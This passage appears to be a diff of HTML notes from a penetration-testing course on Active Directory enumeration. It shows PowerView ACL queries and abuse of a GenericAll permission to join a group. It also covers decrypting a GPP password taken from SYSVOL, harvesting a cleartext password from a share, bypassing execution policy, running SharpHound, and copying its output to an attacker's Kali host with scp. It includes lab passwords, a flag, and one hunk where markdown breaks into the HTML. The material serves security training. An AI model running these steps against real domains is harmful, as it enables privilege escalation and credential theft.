 <p>To create manageable output we use the PS <code>-eq</code> flag to filter the <code>ActiveDirectoryRights</code> prop to only display values that equal <code>GenericAll</code>.  Then we pipe the results into <code>select</code> and display only the <code>SecurityIdentifier</code> and <code>ActiveDirectoryRights</code> prop.</p>
-<pre><code>PS C:\Tools&gt; Get-ObjectAcl -Identity &quot;Management Department&quot; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-ObjectAcl -Identity &quot;Management Department&quot; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
 
 SecurityIdentifier                            ActiveDirectoryRights
 ------------------                            ---------------------
@@ -2126,7 +2126,7 @@ S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
 <li>We find a total of 5 objects with <code>GenericAll</code> perms in <code>Management Department</code></li>
 </ul>
 <p>Convert the SIDs into names.</p>
-<pre><code>PS C:\Tools&gt; &quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;,&quot;S-1-5-32-548&quot;,&quot;S-1-5-18&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot; | Convert-SidToName
+<pre><code class="language-powershell">PS C:\Tools&gt; &quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;,&quot;S-1-5-32-548&quot;,&quot;S-1-5-18&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot; | Convert-SidToName
 CORP\Domain Admins
 CORP\stephanie
 BUILTIN\Account Operators
@@ -2141,7 +2141,7 @@ CORP\Enterprise Admins
 </ul>
 <p>This finding indicates <code>stephanie</code> is a powerful account, which is significant.</p>
 <p>While ehuming the Management Group, we find <code>jen</code> is its only member.  As an experiment to show the power of misconfig object perms, we will try to use out perms as <code>stephanie</code> to add ourselves to the group with <code>net.exe</code>.</p>
-<pre><code>PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /add /domain
+<pre><code class="language-powershell">PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /add /domain
 The request will be processed at a domain controller for domain corp.com.
 
 The command completed successfully.
@@ -2150,7 +2150,7 @@ The command completed successfully.
 <li>We should now be a member of the group.</li>
 <li>Verify with <code>Get-NetGroup</code></li>
 </ul>
-<pre><code>PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /add /domain
+<pre><code class="language-powershell">PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /add /domain
 The request will be processed at a domain controller for domain corp.com.
 
 The command completed successfully.
@@ -2166,7 +2166,7 @@ member
 <li><code>stephanie</code> has been added.</li>
 </ul>
 <p>Now that we have abused <code>GenericAll</code> perm, use it to clean up after ourselves.</p>
-<pre><code>PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /del /domain
+<pre><code class="language-powershell">PS C:\Tools&gt; net group &quot;Management Department&quot; stephanie /del /domain
 The request will be processed at a domain controller for domain corp.com.
 
 The command completed successfully.
@@ -2185,7 +2185,7 @@ CN=jen,CN=Users,DC=corp,DC=com
 <h5>Enumerating Domain Shares</h5>
 <p>Now we shift our focus to domain shares.  Domain shares often contain critical info about the env, which we can use to our advantage.</p>
 <p>We&#39;ll use PowerView&#39;s <code>Find-DomainShare</code> function to find the shares in the domain.  We could add the <code>-CheckShareAccess</code> flag, displaying only shares available to us, but we will skip this for now to return a full list.</p>
-<pre><code>PS C:\Tools&gt; Import-Module .\PowerView.ps1
+<pre><code class="language-powershell">PS C:\Tools&gt; Import-Module .\PowerView.ps1
 PS C:\Tools&gt; Find-DomainShare
 
 Name           Type Remark                 ComputerName
@@ -2224,7 +2224,7 @@ IPC$     2147483651 Remote IPC             CLIENT76.corp.com
 <li>We should investigate each for interesting info.</li>
 </ul>
 <p>We will focus on <a href="https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx">SYSVOL</a>, which may include folder residing on the DC itself.  This share is generally used for domain policies and scripts.  the <code>SYSVOL</code> folder is mapped to <code>%SystemRoot%\SYSVOL\Sysvol\domain-name</code> by default on the DC and every domain user has access to it.</p>
-<pre><code>PS C:\Tools&gt; ls \\dc1.corp.com\sysvol\corp.com\
+<pre><code class="language-powershell">PS C:\Tools&gt; ls \\dc1.corp.com\sysvol\corp.com\
 
 
     Directory: \\dc1.corp.com\sysvol\corp.com
@@ -2236,7 +2236,7 @@ d-----         9/21/2022   1:11 AM                Policies
 d-----          9/2/2022   4:08 PM                scripts
 </code></pre>
 <p>In an assessment we should investigate every folder we discover in search of interesting items.  For now, let&#39;s examine the <code>Policies</code> folder.</p>
-<pre><code>PS C:\Tools&gt; ls \\dc1.corp.com\sysvol\corp.com\Policies\
+<pre><code class="language-powershell">PS C:\Tools&gt; ls \\dc1.corp.com\sysvol\corp.com\Policies\
 
 
     Directory: \\dc1.corp.com\sysvol\corp.com\Policies
@@ -2249,7 +2249,7 @@ d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04
 d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
 </code></pre>
 <p>All folders are of interest but we will explore <code>oldpolicy</code> first and find a file named <code>old-policy-backup.xml</code>.</p>
-<pre><code>PS C:\Tools&gt; cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<pre><code class="language-powershell">PS C:\Tools&gt; cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;Groups   clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
   &lt;User   clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;
@@ -2278,15 +2278,15 @@ d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04
 <p>Due to the naming convention, it appears this is an older domain policy file.  Domain admins often forget about them when implementing new policy, they are a common artifact.  In this case the XML describes and old policy, helpful for learning about the new policies, and an encrypted password for the local built in admin account.  The encrypted password could be extremely valuable.</p>
 <p>Sys admins often change local workstation passwords through <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)">Group Policy Preferences (GPP)</a>.  </p>
 <p>Although GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2">MSDN</a>.  We can use the key to decrypt these passwords, we will use <code>gpp-decrypt</code> Ruby script in Kali.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
 └─$ gpp-decrypt &quot;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&quot;
 P@$$w0rd
-</code></pre>
-<ul>
-<li>We successfullly decrypt the password and make note of <code>P@$$w0rd</code></li>
-</ul>
-<p><code>Find-DomainShare</code> revealed another share of potential interest.  Let&#39;s check out <code>docshare</code> on <code>FILES04.corp.com</code>, which is not the default share.</p>
-<pre><code>PS C:\Users\stephanie&gt; ls \\FILES04\docshare
+```bash
+- We successfullly decrypt the password and make note of `P@$$w0rd`
+
+`Find-DomainShare` revealed another share of potential interest.  Let&#39;s check out `docshare` on `FILES04.corp.com`, which is not the default share.
+```powershell
+PS C:\Users\stephanie&gt; ls \\FILES04\docshare
 
 
     Directory: \\FILES04\docshare
@@ -2297,7 +2297,7 @@ Mode                 LastWriteTime         Length Name
 d-----         9/21/2022   2:02 AM                docs
 </code></pre>
 <p>Deeper in the folder structure we find a <code>do-not-share</code> folder containing <code>start-email.txt</code>.</p>
-<pre><code>PS C:\Users\stephanie&gt; ls \\FILES04\docshare\docs\do-not-share\
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; ls \\FILES04\docshare\docs\do-not-share\
 
 
     Directory: \\FILES04\docshare\docs\do-not-share
@@ -2345,7 +2345,7 @@ Jeff
 <p>According to the file, <code>jeff</code> stored an email with a possible cleartext password, <code>HenchmanPutridConcon11!</code>.  The password may have been changed, but we make not of it.  With this and the password we collected earlier we are building a rough profile of the password policy for users/computers in the org.  We can use this to create wordlists for password brute forcing, if needed.</p>
 <h6>Labs</h6>
 <p>Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to locate the shares in the modified corp.com domain and enumerate them to obtain the flag.</p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -2413,7 +2413,7 @@ OS{ea2588fec91cf362f27acc35443a727b}
 <p><em>It&#39;s often best to combine automatic and manual enumeration techniques when assessing Active Directory. Even though we could theoretically gather the same information with a manual approach, graphical relationships often reveal otherwise unnoticed attack paths.</em></p>
 <p>First we need to get SharpHound up and running, it is available in several formats.  We can compile it ourselves, use a precompiled bin, or use it as a PowerShell script.  In this case, we will use the PowerShell script located in <code>C:\Tools</code> of CLIENT75.  Let&#39;s open a PowerShell session and import the script.</p>
 <p>We can now start collecting domain data.  In order to run SharpHound, we must first run <code>Invoke-BloodHound</code>, which isn&#39;t intuitive since we&#39;re only running SharpHound.  Use <code>Get-Help</code> to learn more about the command.</p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -2461,7 +2461,7 @@ REMARKS
 <p>We start with the <code>-CollectionMethod</code>, which describes the various <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html">collection methods</a>.  We&#39;ll attempt to gather all data, which will perform all collection methods except for local group policies.</p>
 <p>SharpHound will gather data in JSON files, automatically zipping them, by default which makes it easier to transfer files to Kali.  Save the output file on our desktop with the &quot;corp audit&quot; prefix as shown below.</p>
 <p>Data collection may tabke a few minutes, depending on the size of the env.  Let&#39;s examine the output.</p>
-<pre><code>PS C:\Tools&gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix &quot;corp audit&quot;
+<pre><code class="language-powershell">PS C:\Tools&gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix &quot;corp audit&quot;
 2023-12-06T07:19:33.4933370-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
 2023-12-06T07:19:33.6181269-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
 2023-12-06T07:19:33.6316517-08:00|INFORMATION|Initializing SharpHound at 7:19 AM on 12/6/2023
@@ -2488,7 +2488,7 @@ Closing writers
 <li>Varies based on objects and sessions in the domain.</li>
 </ul>
 <p>SharpHound took a &quot;snapshot&quot; of the domain from the <code>stephanie</code> user, allowing us to analyze everything the user account has access to.  The data is store in a zip file on the user&#39;s desktop.</p>
-<pre><code>PS C:\Tools&gt; ls C:\Users\stephanie\Desktop\
+<pre><code class="language-powershell">PS C:\Tools&gt; ls C:\Users\stephanie\Desktop\
 
 
     Directory: C:\Users\stephanie\Desktop
@@ -2517,7 +2517,7 @@ Mode                 LastWriteTime         Length Name
 <p>In this section we will analyze the domain data using BloodHound in Kali, it should be noted that we can install the app and deps on Win systems as well.</p>
 <p>To use BloodHound, we need to start the <a href="https://neo4j.com/">Neo4j</a> service, which is installed by default.  Note, when BloodHound is installed with APT, the Neo4j service is automatically installed.</p>
 <p>Neo4j is an open source graph DB (NoSQL) that creates nodes, edges, and properties instead of simple rows and columns.  This visualizes our collected data, start the Neo4j service.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
 └─$ sudo neo4j start           
 Directories in use:
 home:         /usr/share/neo4j
@@ -2544,7 +2544,7 @@ There may be a short delay until the server is ready.
 </ul>
 <p>We can now auth to the DB and run our own queries against it.  Since we haven&#39;t imported any data yet there isn&#39;t much we can do and we would prefer to let BloodHound run the queries for us.</p>
 <p>With Neo4j running, start BloodHound.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
 └─$ bloodhound
 </code></pre>
 <ul>
@@ -2552,7 +2552,7 @@ There may be a short delay until the server is ready.
 <li>The green check mark in the first col indicates BlooHound has detected the running Neo4j DB.</li>
 </ul>
 <p>We don&#39;t have any visual data yet as we haven&#39;t imported anything.  To import the data we must first transfer the data zip from our Win machine to Kali.  </p>
-<pre><code>PS C:\Users\stephanie&gt; scp &#39;.\Desktop\corp audit_20231207063037_BloodHound.zip&#39; admin@192.168.45.174:~/
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; scp &#39;.\Desktop\corp audit_20231207063037_BloodHound.zip&#39; admin@192.168.45.174:~/
 admin@192.168.45.174&#39;s password:
 corp audit_20231207063037_BloodHound.zip                         100%   12KB 157.9KB/s   00:00
 </code></pre>
@@ -2602,7 +2602,7 @@ BloodHound shows an edge in the form of a line between the user objects and <cod
 <p>In this domain, we were able to enum most info using manual methods, but in a large scale env with 1000s of users/computers this can be hard to digest.  The queries from SharpHound generate noise in the network that will likely be caught by security analysis, it is a tool worth utilizing if the situation permits as it visualizes the findings for us.</p>
 <h6>Labs</h6>
 <p>Capstone Exercise: Start VM Group 2 and log in as stephanie to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.</p>
-<pre><code>PS C:\Users\stephanie&gt; powershell -ep bypass
+<pre><code class="language-powershell">PS C:\Users\stephanie&gt; powershell -ep bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -4408,7 +4408,7 @@ PS C:\Tools&gt; cat \\dc1\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.x
 </code></pre>
 <p>IMPORTANT: You have to check shortest path to each user one by one to find vectors.
 <img src="../_resources/cc6dfe09044aff40135324ee032993cf.png" alt="cc6dfe09044aff40135324ee032993cf.png"></p>
-<pre><code>PS C:\Tools&gt; Get-ObjectAcl -Identity robert | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
+<pre><code class="language-powershell">PS C:\Tools&gt; Get-ObjectAcl -Identity robert | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
 
 SecurityIdentifier                            ActiveDirectoryRights
 ------------------                            ---------------------
